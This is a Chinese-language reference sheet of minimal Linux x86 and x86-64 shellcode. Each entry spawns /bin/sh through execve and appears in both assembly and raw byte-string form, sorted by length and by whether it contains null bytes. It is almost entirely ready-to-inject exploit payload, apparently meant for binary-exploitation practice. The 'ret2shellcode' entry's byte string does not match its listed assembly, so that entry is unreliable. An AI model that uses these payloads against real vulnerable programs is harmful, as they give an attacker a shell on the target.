# Linux ShellCode总结

在寄存器都是非理想值情况下(shellcode可根据环境具体触发时寄存器的值做长度调整)，本着最优通用的原则，整理了Linux下32位和64位最短通用shellcode的编写。

## 32位

### 有"\x00"最短 20 byte

```assembly
xor ecx,ecx               
mul ecx                   
mov al,0xb                
push 0x68732f             
push 0x6e69622f           
mov ebx,esp               
int 0x80
```

### 无"\x00"最短 21 byte

```assembly
xor ecx,ecx
mul ecx
push eax
mov al,0xb
push 0x68732f2f   
push 0x6e69622f   
mov ebx,esp
int 0x80
```

### 标准shellcode 23 byte

```assembly
xor ecx,ecx
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
mov al,0xB
int 0x80
```

### 此外

```assembly
push 0x68732f	;push '/sh'
push 0x6e69622f	;push '/bin'
mov ebx, esp	;ebx='/bin/sh'
xor edx, edx	;edx=0
xor ecx, ecx	;ecx=0
mov eax, 0xb	;eax=0xb
int 0x80
```

## 64位

### 有"\x00"最短 22 byte

```assembly
xor rsi,rsi
mul esi
mov rbx,0x68732f6e69622f
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
```

### 无"\x00" 最短23 byte

```assembly
xor rsi,rsi
mul esi
push rax
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
# shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
```

23 byte的另一种写法：

```assembly
xor    esi, esi
movabs rbx, 0x68732f2f6e69622f
push   rsi
push   rbx
push   rsp
pop    rdi
push   0x3b
pop    rax
xor    edx, edx
syscall

# shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
# shellcode = b'1\xf6H\xbb/bin//shVST_j;X1\xd2\x0f\x05'
```

### 标准shellcode 31 byte

```assembly
xor    rdi,rdi
xor    rsi,rsi
xor    rdx,rdx
xor    rax,rax
push   rax
mov rbx,0x68732f2f6e69622f
push   rbx
mov    rdi,rsp
mov    al,0x3b
syscall
# shellcode = b'H1\xffH1\xf6H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7\xb0;\x0f\x05'
```

### ret2shellcode 22byte

```assembly
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

### 其它 34byte

```assembly
xor    rax, rax
add    rax, 0x3b
xor    rdi, rdi
push   rdi
movabs rdi, 0x68732f2f6e69622f
push   rdi
lea    rdi, [rsp]
xor    rsi, rsi
xor    rdx, rdx
syscall
# shellcode = b'\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05'
```



### 

